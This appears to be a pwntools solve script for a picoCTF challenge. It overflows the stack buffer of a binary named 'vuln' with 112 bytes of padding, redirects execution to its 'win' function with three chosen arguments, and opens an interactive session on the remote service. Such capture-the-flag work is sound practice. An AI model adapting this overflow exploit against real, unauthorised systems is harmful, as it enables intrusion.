import pwn

LOCAL = 0
HOST = "saturn.picoctf.net"
PORT = 49194

elf = pwn.ELF("./vuln")
if LOCAL:
    p = elf.process()
else:
    p = pwn.remote(HOST, PORT)

payload = (
    pwn.cyclic(112)
    + pwn.p32(elf.symbols["win"])
    + pwn.p32(0xDEADBEEF)
    + pwn.p32(0xCAFEF00D)
    + pwn.p32(0xF00DF00D)
)
p.sendline(payload)
p.interactive()
